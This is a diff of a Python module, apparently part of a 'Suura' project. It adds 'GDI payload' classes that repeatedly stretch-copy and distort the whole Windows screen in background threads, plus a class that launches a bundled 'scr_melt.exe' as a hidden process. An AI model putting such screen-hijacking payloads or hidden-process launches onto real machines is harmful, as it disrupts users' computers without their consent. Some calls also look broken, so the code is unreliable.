@@ -1,24 +1,28 @@
+"""
+import os
 import time
+import signal
 import ctypes
 import threading
 import random
 user32 = ctypes.windll.user32
 gdi32 = ctypes.windll.gdi32
+from Suura import get_exe_assets,lib_path,to_nt_path
 from Suura.includes.util import Mouse
+from Suura.includes.suura_subprocess import Process,handlers
 class Screen:
     SCREEN_X = user32.GetSystemMetrics(0) # it's defining X position
     SCREEN_Y = user32.GetSystemMetrics(1) # it's defining Y position
 class VAR:
     SRCCOPY = 0X00CC0020
-    SRCAND = 0X008800C6
+    SRCAND = 0X008800C6 #burası fixlenecek ve gdi_util paketinden import edilecek
 class GDI_PAYLOAD:
-    """
     GDI PAYLOAD: 1
-    """
+
     def __init__(self) -> None:
-        """
+        
         Gdi payload stage1 
-        """
+        
         self.Hwnd = user32.GetWindowDC()
         self.window_dc = user32.GetWindowDC(self.Hwnd)
         self.opt = False
@@ -26,9 +30,9 @@ class GDI_PAYLOAD:
         self.ydest = 25
         self.randomized = False
     def start(self,size=2) -> None:
-        """
+        
         Starts gdi payload
-        """
+        
         def draw(opt: bool,screen_pos_x: int,screen_pos_y: int,hwnd,xdest: int,ydest: int,randomize=False):
             while opt.opt:
                 gdi32.StretchBlt(hwnd,
@@ -64,9 +68,9 @@ class GDI_PAYLOAD:
         if isinstance(value,bool):
             self.randomized = value
     def kill(self) -> bool:
-        """
+        
         Free resources
-        """
+        
         return user32.ReleaseDC(self.Hwnd,self.window_dc) == 1 # if equals to 1 succedd
 class GDI_PAYLOAD_2:
     def __init__(self):
@@ -77,8 +81,7 @@ class GDI_PAYLOAD_2:
     def start(self):
         self._opt = True
         def _start(_self):
-            while self._opt:
-                mouse = Mouse()
+            while _self._opt:
                 self.gdi(
                     self.hdc,
                     25,
@@ -93,8 +96,46 @@ class GDI_PAYLOAD_2:
                     VAR.SRCCOPY
                 )
                 #time.sleep(0.1)
-        t = threading.Thread(target=_start,args=[self,])
+        t = threading.Thread(target=_start,args=[self,]
+                             )
         t.daemon = True
         t.start()
     def stop(self):
         self._opt = False
+class MelterGDIPayload:
+    def __init__(self,kill_timer = None):
+        self._timer = 15 # 15 saniye
+        self.bin_path = get_exe_assets(
+            lib_path(
+                to_nt_path(
+                    "assets/binaries/executables/scr_melt.exe"
+                )
+            )
+        )
+        self.process = Process()
+        self.process.command = self.bin_path
+        self.process.parameter = self.bin_path
+        self.process.process_type = handlers.open_hide_process
+        self.proces_pid = None 
+    @property
+    def kill_timer(self):
+        return self._timer
+    @kill_timer.setter
+    def kill_timer(self,kill_time: int):
+        if isinstance(kill_time,int):
+            self._timer = kill_time
+    def kill_procces(self):
+        if not self.proces_pid is None:
+            try:
+                os.kill(self.proces_pid,signal.SIGTERM)
+            except:
+                pass
+    def start(self):
+        if not self._timer is None and isinstance(self._timer,int):
+            pthread_kill_timer = threading.Timer(self._timer,self.kill_procces)
+            pthread_kill_timer.daemon = True
+            pthread_kill_timer.start()
+        process_output = self.process.exec()
+        if not process_output is False:
+            self.proces_pid = process_output.pid
+"""
